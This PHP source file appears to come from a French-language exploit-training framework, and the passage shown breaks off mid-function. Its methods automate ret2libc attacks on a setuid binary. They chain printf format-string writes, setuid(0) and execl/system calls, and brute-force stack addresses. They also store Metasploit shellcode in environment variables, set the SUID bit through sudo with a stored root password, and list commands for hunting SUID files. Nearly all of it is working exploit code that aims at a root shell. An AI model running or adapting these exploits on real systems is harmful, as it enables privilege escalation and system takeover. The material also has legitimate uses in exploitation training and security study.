	$this->ssTitre("Brute Force Addr Here for Null on All Stack");
	$stack_start = $this->elf2stack2start($argv);
	$stack_end = $this->elf2stack2end($argv);
	$min = hexdec($stack_start);$max = hexdec($stack_end);$iter = $max-$min;
	$here_original = $stack_end;
	$this->article("MAX-MIN=ITERATION","$max-$min=$iter");$this->pause();
	
	//for($i=0;$i<=$iter;$i++)
	for($i=4000;$i<=5500;$i++)
	{
		$here_original_tmp = $this->addr2sub($here_original,$i);
		$this->article("ORIGINAL-$i/$iter","$here_original-$i");
		$this->payload_ret2lib4linux_execve_printf_fmt5($offset, $addr_printf,$tab_pop_ret[0], $addr_fm_str, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $here_original_tmp);
	}
	

	$this->note("Enter Addr NULL that you have found");
	$addr_here = $this->hex2norme_32(trim(fgets(STDIN)));
	$this->article("New Addr HERE with App",$addr_here);
	$this->pause();
		
	//foreach($tab_pop_ret as $pop_ret) $this->payload_ret2lib4linux_execve_printf_fmt5($offset, $addr_printf, $pop_ret, $addr_fm_str, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $addr_here);
	
	$pop_ret = $tab_pop_ret[0];
	$this->payload_ret2lib4linux_execve_printf_fmt5($offset, $addr_printf, $pop_ret, $addr_fm_str, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $addr_here);
	
	
	
}


function ret2lib4linux_setuid_printf_fmt8($offset) {
	$this->chapitre("LIBC PRINTF FMT8");


	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&pop ret\"+\"&(%6\$n)\"+\"&printf()\"+\"&pop ret\"+\"&(%8\$n)\"+\"&setuid()\"+\"&pop ret\"+\"&here1\"+\"&execl()\"+\"&exit()\"+\"wrapper\"+\"wrapper\"+\"&here2\"'`");
	
	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"+\"\\x48\\x48\\x48\\x48\"+\"\\x49\\x49\\x49\\x49\"+\"\\x50\\x50\\x50\\x50\"+\"\\x51\\x51\\x51\\x51\"+\"\\x52\\x52\\x52\\x52\"+\"\\x53\\x53\\x53\\x53\"+\"\\x54\\x54\\x54\\x54\"+\"\\x55\\x55\\x55\\x55\"'";
	$argv_offset =($offset) + 32;
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here1 = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));
	$this->article("&here1", $addr_here1);
	$this->pause();
	
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"+\"\\x48\\x48\\x48\\x48\"+\"\\x49\\x49\\x49\\x49\"+\"\\x50\\x50\\x50\\x50\"+\"\\x51\\x51\\x51\\x51\"+\"\\x52\\x52\\x52\\x52\"+\"\\x53\\x53\\x53\\x53\"+\"\\x54\\x54\\x54\\x54\"+\"\\x55\\x55\\x55\\x55\"'";
	$argv_offset =($offset) + 52;
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here2 = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));
	$this->article("&here2", $addr_here2);
	$this->pause();
	
	$addr_wrapper =  $this->elf2addr4env("SHELL");
	$addr_printf = $this->elf2addr4fonction_prog("printf");
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$addr_execl = $this->elf2addr4fonction_prog("execl");
	$addr_setuid = $this->elf2addr4fonction_prog("setuid");
	$this->pause();
	
	$this->id2env("FMT8",0,"%8\$n");$this->pause();
	$addr_fm_str_8 = $this->elf2addr4env("FMT8");
	$this->id2env("FMT6",0,"%6\$n");$this->pause();
	$addr_fm_str_6 = $this->elf2addr4env("FMT6");
	
	$shellcode_hex = $this->file_msf2root("/bin/sh");
	$file_bin = new bin4linux("",$shellcode_hex);
	$file_bin->file_shellcode2graph();
	$this->pause();
	$file_bin->file_h2hex();
	$file_bin->file_shellcode2env(0);
	$addr_cmd = $this->elf2addr4env("shellcode");
	
	//$addr_cmd = $addr_wrapper;
	$this->pause();

	

	$tab_pop_ret = $this->elf2pop1ret4all("???","all");
	$pop_ret = $tab_pop_ret[0];
	
	$this->ssTitre("Brute Force Addr Here for Null 2 on All Stack");
	$stack_start = $this->elf2stack2start($argv);
	$stack_end = $this->elf2stack2end($argv);
	$min = hexdec($stack_start);$max = hexdec($stack_end);$iter = $max-$min;
	$here_original = $stack_end;
	$this->article("MAX-MIN=ITERATION","$max-$min=$iter");$this->pause();
	//for($i=0;$i<=$iter;$i++)
	for($i=3500;$i<=4500;$i++)
	{
	$here_original_tmp = $this->addr2sub($here_original,$i);
	$this->article("ORIGINAL-$i/$iter","$here_original-$i");
	$this->payload_ret2lib4linux_setuid_printf_fmt8($offset, $addr_printf, $pop_ret, $addr_fm_str_6, $addr_fm_str_8, $addr_setuid, $addr_here1, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $here_original_tmp);
	}
	$this->pause();
	
	$this->note("Enter Addr NULL that you have found");
	$addr_null = $this->hex2norme_32(trim(fgets(STDIN)));
	$this->article("New Addr with App",$addr_null);
	$this->pause();
	
	//$addr_null = "0xffffcffc";
	//$addr_here1 = "0xffffd760";
	
	$this->payload_ret2lib4linux_setuid_printf_fmt8($offset, $addr_printf, $pop_ret, $addr_fm_str_6, $addr_fm_str_8, $addr_setuid, $addr_here1, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $addr_null);
	$this->pause();
	
	$this->ssTitre("Brute Force Addr Here for Null 1 on All Stack");
	$stack_start = $this->elf2stack2start($argv);
	$stack_end = $this->elf2stack2end($argv);
	$min = hexdec($stack_start);$max = hexdec($stack_end);$iter = $max-$min;
	$here_original = $stack_end;
	$this->article("MAX-MIN=ITERATION","$max-$min=$iter");$this->pause();
	//for($i=0;$i<=$iter;$i++)
	for($i=3500;$i<=4500;$i++)
	{
		$here_original_tmp = $this->addr2sub($here_original,$i);
		$this->article("ORIGINAL-$i/$iter","$here_original-$i");
		$this->payload_ret2lib4linux_setuid_printf_fmt8($offset, $addr_printf, $pop_ret, $addr_fm_str_6, $addr_fm_str_8, $addr_setuid, $here_original_tmp, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $addr_null);
	}
	$this->pause();
	
	$this->note("Enter Addr that you have found");
	$addr_here1 = $this->hex2norme_32(trim(fgets(STDIN)));
	$this->article("New Addr with App",$addr_null);
	$this->pause();
	//$addr_null = "0xffffcffc";
	//$addr_here1 = "0xffffd760";	// "0xffffcfec" "0xffffcfd4" 0xffffcfcc 0xffffcfcb 0xffffcfca 0xffffcfc9 0xffffcfc8
	
	$this->payload_ret2lib4linux_setuid_printf_fmt8($offset, $addr_printf, $pop_ret, $addr_fm_str_6, $addr_fm_str_8, $addr_setuid, $addr_here1, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $addr_null);
	$this->pause();
	
	}



function payload_ret2lib4linux_setuid_printf_fmt8($offset, $addr_printf, $pop_ret, $addr_fm_str_6, $addr_fm_str_8, $addr_setuid, $addr_here1, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $addr_here2) {
	
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&pop ret\"+\"&(%6\$n)\"+\"&printf()\"+\"&pop ret\"+\"&(%8\$n)\"+\"&setuid()\"+\"&pop ret\"+\"&here1\"+\"&execl()\"+\"&exit()\"+\"\\\"exec_file_path\\\"\"+\"\\\"argv_exec_file_path\\\"\"+\"&here2\"'`");
			$addr_printf = $this->hex2norme_32($addr_printf);
			$pop_ret = $this->hex2norme_32($pop_ret);
			$addr_fm_str_6 = $this->hex2norme_32($addr_fm_str_6);
			$addr_fm_str_8 = $this->hex2norme_32($addr_fm_str_8);
			$addr_setuid = $this->hex2norme_32($addr_setuid);
			$addr_here1 = $this->hex2norme_32($addr_here1);
			$addr_execl = $this->hex2norme_32($addr_execl);
			$addr_exit = $this->hex2norme_32($addr_exit);
			$addr_wrapper = $this->hex2norme_32($addr_wrapper);
			$addr_cmd = $this->hex2norme_32($addr_cmd);
			$addr_here2  = $this->hex2norme_32($addr_here2);

	
	$this->article("Variables", "\n\t&printf:$addr_printf\n\t&pop_ret:$pop_ret\n\t&fmt6:$addr_fm_str_6\n\t&fmt8:$addr_fm_str_8\n\t&setuid:$addr_setuid\n\t&here1:$addr_here1\n\t&execl:$addr_execl\n\t&exit:$addr_exit\n\t&wrapper:$addr_wrapper\n\t&cmd:$addr_cmd\n\t&here2:$addr_here2");
			$addr_printf = $this->hex2rev_32($addr_printf);
			$pop_ret = $this->hex2rev_32($pop_ret);
			$addr_fm_str_6 = $this->hex2rev_32($addr_fm_str_6);
			$addr_fm_str_8 = $this->hex2rev_32($addr_fm_str_8);
			$addr_setuid = $this->hex2rev_32($addr_setuid);
			$addr_here1 = $this->hex2rev_32($addr_here1);
			$addr_execl = $this->hex2rev_32($addr_execl);
			$addr_exit = $this->hex2rev_32($addr_exit);
			$addr_wrapper = $this->hex2rev_32($addr_wrapper);
			$addr_cmd = $this->hex2rev_32($addr_cmd);
			$addr_here2  = $this->hex2rev_32($addr_here2);
			
	// "A"*260+"&Printf()"+"&POP/RET"+"&%6$n"+"&Printf()"+"&POP/RET"+"&%8$n"+"&Setuid()"+"&POP/RET"+"&here1"+"&Execl()"+"&Exit()"+"&/bin/sh"+"&/bin/sh"+"&here2"
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_printf\"+\"$pop_ret\"+\"$addr_fm_str_6\"+\"$addr_printf\"+\"$pop_ret\"+\"$addr_fm_str_8\"+\"$addr_setuid\"+\"$pop_ret\"+\"$addr_here1\"+\"$addr_execl\"+\"$addr_exit\"+\"$addr_wrapper\"+\"$addr_cmd\"+\"$addr_here2\"'";
	//$this->payload2check4norme($cmd,"\\x00\\x20\\x0a");
	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	//$this->elf2debug4payload($cmd);
	$this->requette($query);
	return $cmd;
}


function payload_ret2lib4linux_execve_printf_fmt5($offset, $addr_printf, $pop_ret, $addr_fm_str, $addr_execl, $addr_exit, $addr_wrapper, $addr_cmd, $addr_here) {
	
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&pop ret\"+\"&(%5\$n)\"+\"&execl()\"+\"&exit()\"+\"\\\"exec_file_path\\\"\"+\"\\\"argv_exec_file_path\\\"\"+\"&here\"'`");
	
			$addr_printf = $this->hex2norme_32($addr_printf);
			$pop_ret = $this->hex2norme_32($pop_ret);
			$addr_fm_str = $this->hex2norme_32($addr_fm_str);
			$addr_execl = $this->hex2norme_32($addr_execl);
			$addr_exit = $this->hex2norme_32($addr_exit);
			$addr_wrapper = $this->hex2norme_32($addr_wrapper);
			$addr_cmd = $this->hex2norme_32($addr_cmd);
			$addr_here  = $this->hex2norme_32($addr_here);
	
	$this->article("Variables", "\n\t&printf:$addr_printf\n\t&pop_ret:$pop_ret\n\t&fmt:$addr_fm_str\n\t&execl:$addr_execl\n\t&exit:$addr_exit\n\t&wrapper:$addr_wrapper\n\t&cmd:$addr_cmd\n\t&here:$addr_here");
				
	
			$addr_printf = $this->hex2rev_32($addr_printf);
			$pop_ret = $this->hex2rev_32($pop_ret);
			$addr_fm_str = $this->hex2rev_32($addr_fm_str);
			$addr_execl = $this->hex2rev_32($addr_execl);
			$addr_exit = $this->hex2rev_32($addr_exit);
			$addr_wrapper = $this->hex2rev_32($addr_wrapper);
			$addr_cmd = $this->hex2rev_32($addr_cmd);
			$addr_here  = $this->hex2rev_32($addr_here);
			
			
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_printf\"+\"$pop_ret\"+\"$addr_fm_str\"+\"$addr_execl\"+\"$addr_exit\"+\"$addr_wrapper\"+\"$addr_cmd\"+\"$addr_here\"'";

	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	//$this->elf2debug4payload($cmd);
	return $cmd;
}
function ret2lib4linux_execve_printf_setuid($offset) {
	
	$this->gtitre("with printf()");
	$this->titre("Utilisation d'un wrapper");
	$wrapper = prog_compile("setuid_execl", "-m32");
	$this->requette("ls -al $wrapper");
	shellcode_env(0, $wrapper);
	$this->pause();
	$argv_wrapper = shellcode_env_addr_ret();
	$this->pause();
	$this->requette(" chown root:root $wrapper");
	$this->requette("ls -al $wrapper");
	$this->pause();
	$this->requette(" chmod u+s $wrapper");
	$this->requette("ls -al $wrapper");
	$this->pause();
	$this->article("why printf", "printf function in order to write null bytes into our final buffer without terminating the string.");
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&execl()\"+\"&(%3\$n)\"+\"&\\\"/bin/sh\\\"\"+\"&\\\"/bin/sh\\\"\"+\"&here\"'`");
	$this->pause();
	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"'";
	$argv_offset =($offset) + 20;
	// $stack_start = stack_start($this->file_path,$argv);$stack_end = stack_end($this->file_path,$argv);
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));

	$this->article("&here", $addr_here);
	$addr_printf = $this->elf2addr4fonction_prog("printf");
	// $addr_bin_sh = libc_search_bin_sh($this->file_path);
	fmt_env(0, "%3\$n");
	$this->pause();
	$addr_fm_str = fmt_env_addr_ret();
	$addr_wrapper = $argv_wrapper;
	
	$this->gtitre("EXECL"); // OK
	$addr_execl = $this->elf2addr4fonction_prog("execl");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
	$this->gtitre("EXECLP"); // OK
	$addr_execl = $this->elf2addr4fonction_prog("execlp");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
	
	$this->gtitre("EXECV"); // Obstable x20 -> &EXECV: 0xf7ebdd20
	$addr_execl = $this->elf2addr4fonction_prog("execv");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
	$this->gtitre("EXECVP"); // Obstable x20 -> &EXECVP: 0xf7ebe020
	$addr_execl = $this->elf2addr4fonction_prog("execvp");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
	
	$this->gtitre("EXECLE"); // function founded but no exploitable -> &EXECLE: 0xf7ebdd60
	$addr_execl = $this->elf2addr4fonction_prog("execle");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
	$this->gtitre("EXECVPE"); // function founded but no exploitable -> &EXECVPE: 0xf7ebe1b0
	$addr_execl = $this->elf2addr4fonction_prog("execvpe");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
	$this->gtitre("EXECVE"); // function founded but no exploitable -> &EXECVE: 0xf7ebdbe0
	$addr_execl = $this->elf2addr4fonction_prog("execve");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
	$this->gtitre("EXECLPE"); // Not Find Function execlpe in gdb
	$addr_execl = $this->elf2addr4fonction_prog("execlpe");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper, $addr_here, $offset);
	$this->pause();
}

public function ret2lib4linux_setuid_intro($offset) {
	$this->chapitre("Setuid 0");
	
	$this->os2aslr4no();
	
	/*
	find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
	 */
	$this->requette("ls -al $this->file_path");$this->pause();
	$this->requette("echo '$this->root_passwd' | sudo -S chown root:root $this->file_path");
	$this->requette("ls -al $this->file_path");
	$this->pause();
	$this->requette("echo '$this->root_passwd' | sudo -S chmod u+s $this->file_path");
	$this->requette("ls -al $this->file_path");
	$this->pause();
	$this->ssTitre("Show suid files");
	$this->requette("find /usr -type f -user root \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; 2>/dev/null");
	$this->requette("find /bin -type f -user root \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; 2>/dev/null");
	$this->pause();
	$this->requette("ls -al /usr/bin/passwd");
	$this->requette("ls -al /bin/ping");
	$this->pause();
	
	$this->titre("Creation d'un shellcode wrapper setuid(0) avec msfpayload");
	$this->ssTitre("SHELLCODE ELF");
	$shellcode_hex = $this->file_msf2root("/bin/sh");
	$file_bin = new bin4linux("",$shellcode_hex);
	$file_bin->file_shellcode2graph();
	$this->pause();
	$file_bin->file_h2hex();
	$file_bin->file_shellcode2env(0);
	$this->titre("Find Variables");
	$argv_system = $this->elf2addr4env("shellcode");
	$addr_system = $this->elf2addr4fonction_prog("system");
	$addr_setuid = $this->elf2addr4fonction_prog("setuid");
	$argv_wrapper = $this->elf2addr4env("SHELL");
	$this->pause();
	
	$this->titre("Put Setuid(0) as Arguments");
	$argv_setuid = "0x00000000";
	$this->payload_ret2lib4linux_setuid_intro($offset, $addr_setuid, $addr_system, $argv_setuid, $argv_wrapper);
	$argv_setuid = "0x01010101";
	$this->note("Once get a shell, enter whoami,id ");
	$this->requette("php -r \"echo hexdec('\\x01\\x01\\x01\\x01');\";echo");
	$this->payload_ret2lib4linux_setuid_intro($offset, $addr_setuid, $addr_system, $argv_setuid, $argv_wrapper);
	$this->note("Once get a shell, enter id, whoami");
	$this->requette("php -r \"echo hexdec('$argv_system');\";echo");
	$this->payload_ret2lib4linux_setuid_intro($offset, $addr_setuid, $addr_system, $argv_system, $argv_wrapper);
	$this->note("we need setuid(0)");
	$this->question("How to put a 0 on setuid() ->  setuid(0)");
	$this->pause();
	
	$this->article("why printf", "printf function in order to write null bytes into our final buffer without terminating the string.");
	$this->article("Remember the template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&execl()\"+\"&(%3\$n)\"+\"&Wrapper\"+\"&Wrapper\"+\"&here\"'`");
	$this->pause();
}

public function ret2lib4linux_setuid_printf_fmt3_execl($offset){ // enlever plus tard 
	$this->os2aslr4no();
	$this->titre("Find Variables");
	$addr_printf = $this->elf2addr4fonction_prog("printf");
	$addr_system = $this->elf2addr4fonction_prog("system");
	$addr_execl = $this->elf2addr4fonction_prog("execl");
	$addr_setuid = $this->elf2addr4fonction_prog("setuid");
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$argv_wrapper = $this->elf2addr4env("SHELL");

	$this->requette("ls -al $this->file_path");$this->pause();
	$this->requette("echo '$this->root_passwd' | sudo -S chown root:root $this->file_path");
	$this->requette("ls -al $this->file_path");
	$this->pause();
	$this->requette("echo '$this->root_passwd' | sudo -S chmod u+s $this->file_path");
	$this->requette("ls -al $this->file_path");
	$this->pause();

	$this->titre("Creation d'un shellcode wrapper setuid(0) avec msfpayload");
	$this->ssTitre("SHELLCODE ELF");
	$shellcode_hex = $this->file_msf2root("/bin/sh");
	$file_bin = new bin4linux("",$shellcode_hex);
	$file_bin->file_shellcode2graph();
	$this->pause();
	$file_bin->file_h2hex();
	$file_bin->file_shellcode2env(0);
	$argv_system = $this->elf2addr4env("shellcode");
	$this->pause();

	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"'";
	$argv_offset =($offset) + 20;
	// $stack_start = stack_start($this->file_path,$argv);$stack_end = stack_end($this->file_path,$argv);
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));
	$this->article("&here", $addr_here);

	$this->id2env("FMT",0,"%3\$n");$this->pause();
	$addr_fm_str = $this->elf2addr4env("FMT");

	$this->ssTitre("Brute Force Addr Here for Null on All Stack");
	$stack_start = $this->elf2stack2start($argv);
	$stack_end = $this->elf2stack2end($argv);
	$min = hexdec($stack_start);$max = hexdec($stack_end);$iter = $max-$min;
	$here_original = $stack_end;
	$this->article("MAX-MIN=ITERATION","$max-$min=$iter");$this->pause();
	//for($i=0;$i<=$iter;$i++)
	for($i=4000;$i<=4500;$i++)
	{
		$here_original_tmp = $this->addr2sub($here_original,$i);
		$this->article("ORIGINAL-$i/$iter","$here_original-$i");
		$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($offset, $addr_printf, $addr_execl, $addr_fm_str, $argv_system, $argv_system, $here_original_tmp);
	}
	$this->pause();

	$this->note("Enter Addr NULL that you have found");
	$addr_null = $this->hex2norme_32(trim(fgets(STDIN)));
	$this->article("New Addr HERE with App",$addr_null);
	$this->pause();

	$this->payload_ret2lib4linux_setuid_printf_fmt3_execl($offset, $addr_printf, $addr_execl, $addr_fm_str, $argv_wrapper, $argv_system, $addr_null);
	$this->pause();

}



public function ret2lib4linux_setuid_sprintf($offset) {
	$this->titre(" SPRINTF SETUID SYSTEM");
	$this->os2aslr4no();
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&sprintf()\"+\"&setuid()\"+\"&here1()\"+\"&(%2\$n&system())\"+\"&Wrapper\"+\"&here1()\"'`");
	$this->pause();
	$addr_sprintf = $this->elf2addr4fonction_prog("sprintf");
	$addr_setuid = $this->elf2addr4fonction_prog("setuid");
	$addr_system = $this->elf2addr4fonction_prog("system");
	
	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"'";
	$argv_offset =($offset) + 8;
	// $stack_start = stack_start($this->file_path,$argv);$stack_end = stack_end($this->file_path,$argv);
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));
	$this->article("&here", $addr_here);
	
	$addr_wrapper = $this->elf2addr4env("SHELL");
	$this->pause();
	$put_env = "%2\$n".$this->hex2raw($addr_wrapper);
	$this->id2env("FMT2", 0,$put_env);
	$addr_fm_str = $this->elf2addr4env("FMT2");
	// ne fonctionne pas a cause de l'adresse de sprintf -> &sprintf:0xf7e55300
	// on peut utiliser une autre function scanf()
	
	$this->ssTitre("Brute Force Addr Here for Null on All Stack");
	$stack_start = $this->elf2stack2start($argv);
	$stack_end = $this->elf2stack2end($argv);
	$min = hexdec($stack_start);$max = hexdec($stack_end);$iter = $max-$min;
	$here_original = $stack_end;
	$this->article("MAX-MIN=ITERATION","$max-$min=$iter");$this->pause();
	//for($i=0;$i<=$iter;$i++)
	for($i=3500;$i<=4500;$i++)
	{
		$here_original_tmp = $this->addr2sub($here_original,$i);
		$this->article("ORIGINAL-$i/$iter","$here_original-$i");
		$this->payload_ret2lib4linux_setuid_sprintf($offset, $addr_sprintf, $addr_setuid, $here_original_tmp, $addr_fm_str, $addr_wrapper, $here_original_tmp);
	}
	$this->pause();
	
	$this->note("Enter Addr NULL that you have found");
	$addr_null = $this->hex2norme_32(trim(fgets(STDIN)));
	$this->article("New Addr HERE with App",$addr_null);
	$this->pause();
	$this->payload_ret2lib4linux_setuid_sprintf($offset, $addr_sprintf, $addr_setuid, $addr_here, $addr_fm_str, $addr_wrapper, $addr_here);
	$this->pause();
}


function ret2lib4linux_setuid_scanf($offset) {
	$this->chapitre(" SCANF SETUID SYSTEM");
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&scanf()\"+\"&setuid()\"+\"&here1()\"+\"&(%2\$n&system())\"+\"&Wrapper\"+\"&here1()\"'`");
	$this->pause();
	$addr_scanf = $this->elf2addr4fonction_prog("scanf");
	$addr_setuid = $this->elf2addr4fonction_prog("setuid");
	$addr_system = $this->elf2addr4fonction_prog("system");
	
	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"'";
	$argv_offset =($offset) + 8;
	// $stack_start = stack_start($this->file_path,$argv);$stack_end = stack_end($this->file_path,$argv);
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));
	$this->article("&here", $addr_here);
	$addr_bin_sh = libc_search_bin_sh();
	
	// $this->titre("Utilisation d'un wrapper");$wrapper = prog_compile("simple_system","-m32");$this->requette("ls -al $wrapper");env_put(0,"shellcode",$wrapper);$this->pause();$addr_wrapper = env_addr_ret("shellcode",$this->file_path);$this->pause();
	// $addr_system_rev_raw = shellcode_hex2raw(addr2hex($addr_system));
	$addr_system_rev_raw = shellcode_hex2raw(hex_rev_32($addr_system));
	// $addr_system_rev_raw = shellcode_hex2raw($addr_system);
	// $addr_system_rev_raw = addr2hex($addr_system);
	$put_env = "%2\$n" . $addr_system_rev_raw;
	env_put(0, "fmt", $put_env);
	$this->pause();
	$addr_fm_str = env_addr_ret("fmt");
	// ne fonctionne pas a cause de l'adresse de scanf -> &scanf:0xf7e55300
	// on peut utiliser une autre function scanf()
	
	$addr_here = "0xffa5372c";
	
	// $addr_here = "0xffffd136";
	
	$start = hexdec($addr_here) - 1000;
	$end = hexdec($addr_here) + 1000;
	$diff = $end - $start;
	
	for($i = 0, $j = $start; $j <= $end; $j ++, $i ++) {
		$this->ssTitre("Here Here+4");
		$addr_here = $j;
		$addr_here = dechex($addr_here);
		$this->article("$i/$diff", "0x$addr_here");
		$addr_null = dechex(hexdec($addr_here) + 4);
		$this->payload_ret2lib4linux_setuid_sprintf($offset, $addr_scanf, $addr_setuid, $addr_here, $addr_fm_str, $addr_bin_sh, $addr_null);
	}
	
	$this->pause();
}


function ret2lib4linux_gets($offset) {
	$this->titre(" GETS");
	$this->article("POP RET AND POP POP RET", "
		[ ... ] [ addr of function1 in libc ] [ pop-ret ] [arg1] [ addr of function2 in libc ]
		limitation: argument can only be four bytes
	
